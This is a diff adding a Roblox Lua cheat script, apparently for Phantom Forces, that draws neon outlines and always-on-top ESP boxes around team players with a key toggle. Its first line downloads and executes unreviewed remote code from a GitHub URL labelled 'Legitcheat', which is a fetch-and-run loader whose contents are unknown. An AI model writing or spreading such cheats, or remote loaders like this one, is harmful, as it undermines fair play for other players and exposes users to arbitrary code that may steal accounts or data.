@@ -1,0 +1,156 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/1337kat/P-h-a-n-t-o-m-F-o-r-c-e-s-/main/Legitcheat'),true))()
+
+task.spawn(function()
+local UserInputService = game:GetService("UserInputService")
+
+enemyteam = game.Workspace.Players:GetChildren()[1]
+friendlyteam = game.Workspace.Players:GetChildren()[2]
+
+-- Configuration
+local OUTLINE_THICKNESS = 0.05
+local OUTLINE_GLOW = 0.7
+local ENEMY_COLOR = Color3.new(1, 0.2, 0.2)
+local FRIENDLY_COLOR = Color3.new(0.2, 1, 0.3)
+
+-- true = show friendly only
+-- false = show enemy only
+local showFriendly = true
+local switched = true
+
+-- Helper function to create realistic outline
+local function createRealisticOutline(model, color)
+    if model:FindFirstChild("OutlineEffect") then return end
+
+    local outlineContainer = Instance.new("Folder")
+    outlineContainer.Name = "OutlineEffect"
+    outlineContainer.Parent = model
+
+    -- 1. 3D outline
+    for _, part in ipairs(model:GetDescendants()) do
+        if part:IsA("BasePart") then
+            local outlinePart = part:Clone()
+            outlinePart.Name = "OutlinePart"
+            outlinePart.Anchored = false
+            outlinePart.CanCollide = false
+            outlinePart.Transparency = 0.7
+            outlinePart.Material = Enum.Material.Neon
+            outlinePart.Color = color
+            outlinePart.Size = part.Size + Vector3.new(OUTLINE_THICKNESS, OUTLINE_THICKNESS, OUTLINE_THICKNESS)
+            outlinePart.CFrame = part.CFrame
+
+            local weld = Instance.new("WeldConstraint")
+            weld.Part0 = part
+            weld.Part1 = outlinePart
+            weld.Parent = outlinePart
+
+            outlinePart.Parent = outlineContainer
+        end
+    end
+
+    -- 2. Hollow square ESP box
+    local glowGui = Instance.new("BillboardGui")
+    glowGui.Name = "GlowEffect"
+    glowGui.AlwaysOnTop = true
+    glowGui.Size = UDim2.new(3, 0, 3, 0)
+    glowGui.StudsOffset = Vector3.new(0, 0, 0)
+    glowGui.Adornee = model.PrimaryPart or model:FindFirstChildWhichIsA("BasePart")
+
+    local glowFrame = Instance.new("Frame")
+    glowFrame.Size = UDim2.new(1, 0, 1, 0)
+    glowFrame.BackgroundTransparency = 1
+    glowFrame.Parent = glowGui
+
+    local border = 0.08
+
+    local function makeEdge(size, pos)
+        local f = Instance.new("Frame")
+        f.Size = size
+        f.Position = pos
+        f.BackgroundColor3 = color
+        f.BorderSizePixel = 0
+        f.BackgroundTransparency = 0.2
+        f.Parent = glowFrame
+    end
+
+    makeEdge(UDim2.new(1, 0, border, 0), UDim2.new(0, 0, 0, 0)) -- top
+    makeEdge(UDim2.new(1, 0, border, 0), UDim2.new(0, 0, 1 - border, 0)) -- bottom
+    makeEdge(UDim2.new(border, 0, 1, 0), UDim2.new(0, 0, 0, 0)) -- left
+    makeEdge(UDim2.new(border, 0, 1, 0), UDim2.new(1 - border, 0, 0, 0)) -- right
+
+    glowGui.Parent = outlineContainer
+
+    -- 3. Edge detection
+    for _, part in ipairs(model:GetDescendants()) do
+        if part:IsA("MeshPart") then
+            local surfaceGui = Instance.new("SurfaceGui")
+            surfaceGui.Name = "EdgeEffect"
+            surfaceGui.Face = Enum.NormalId.Right
+            surfaceGui.AlwaysOnTop = true
+            surfaceGui.LightInfluence = 0
+            surfaceGui.Brightness = 2
+
+            local edgeFrame = Instance.new("Frame")
+            edgeFrame.Size = UDim2.new(1, 0, 1, 0)
+            edgeFrame.BackgroundColor3 = color
+            edgeFrame.BackgroundTransparency = 0.8
+            edgeFrame.BorderSizePixel = 0
+            edgeFrame.Parent = surfaceGui
+
+            surfaceGui.Parent = part
+        end
+    end
+end
+
+-- remove outline directly from a model
+local function removeOutlines(model)
+    local outline = model:FindFirstChild("OutlineEffect")
+    if outline then
+        outline:Destroy()
+    end
+end
+
+-- hard wipe everything under a whole team folder
+local function clearAllOutlines(teamFolder)
+    for _, obj in ipairs(teamFolder:GetDescendants()) do
+        if obj.Name == "OutlineEffect" then
+            obj:Destroy()
+        end
+    end
+end
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.T then
+        showFriendly = not showFriendly
+        switched = true
+    end
+end)
+
+-- Main loop
+while task.wait(0.1) do
+    -- on switch, fully wipe both sides once
+    if switched then
+        clearAllOutlines(enemyteam)
+        clearAllOutlines(friendlyteam)
+        switched = false
+    end
+
+    if showFriendly then
+        for _, v in ipairs(friendlyteam:GetChildren()) do
+            if v:IsA("Model") then
+                if not v:FindFirstChild("OutlineEffect") then
+                    createRealisticOutline(v, FRIENDLY_COLOR)
+                end
+            end
+        end
+    else
+        for _, v in ipairs(enemyteam:GetChildren()) do
+            if v:IsA("Model") then
+                if not v:FindFirstChild("OutlineEffect") then
+                    createRealisticOutline(v, ENEMY_COLOR)
+                end
+            end
+        end
+    end
+end
+end)
